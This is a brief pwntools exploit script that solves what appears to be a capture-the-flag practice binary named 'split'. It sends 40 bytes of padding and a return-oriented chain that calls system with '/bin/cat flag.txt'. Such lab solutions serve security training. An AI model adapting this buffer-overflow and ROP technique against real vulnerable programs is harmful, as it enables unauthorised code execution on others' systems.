from pwn import *

context.binary = elf = ELF('./split')

print(context.binary.symbols)
context.terminal = ('kgx', '-e')

r = process('./split') # gdb.debug('./split', 'b pwnme \n c')
r.recvuntil(b'> ')

# ROP chain
payload  = p64(0x4007c3) # pop rdi; ret
payload += p64(elf.search(b'/bin/cat flag.txt').__next__())
payload += p64(0x40074B) #call system

r.sendline(b'a'*40 + payload)
r.interactive()